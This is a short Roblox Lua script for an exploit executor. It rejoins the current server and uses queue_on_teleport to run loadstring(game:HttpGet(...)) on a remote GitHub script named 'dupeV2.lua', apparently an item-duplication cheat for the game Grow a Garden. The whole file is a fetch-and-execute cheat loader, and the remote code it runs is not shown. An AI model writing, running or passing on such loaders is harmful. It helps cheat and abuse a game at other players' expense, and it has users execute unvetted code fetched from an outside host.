local TeleportService = cloneref(game:GetService("TeleportService"))  
local jobId = game.JobId 

queue_on_teleport([[  
    loadstring(game:HttpGet('https://raw.githubusercontent.com/scytheXlol/Grow-A-Garden-OP-Methods/refs/heads/main/dupeV2.lua'))()
]])

TeleportService:TeleportToPlaceInstance(game.PlaceId, jobId) 
